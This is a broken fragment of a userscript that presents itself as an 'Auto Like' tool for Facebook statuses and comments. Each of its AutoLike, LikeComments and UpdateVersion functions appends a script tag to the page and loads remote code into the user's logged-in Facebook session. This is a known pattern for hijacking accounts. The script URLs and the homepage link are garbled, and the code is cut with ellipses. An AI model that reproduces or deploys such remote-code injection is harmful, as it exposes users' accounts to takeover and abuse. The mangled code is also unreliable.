...
// @description		Auto Like Facebook zero. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			000
// @homepage		http://http://www.copypas2.co.cc/
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//o /las",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="///lac",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="//fb./v211",b.body.appendChild(a);void(0);};}
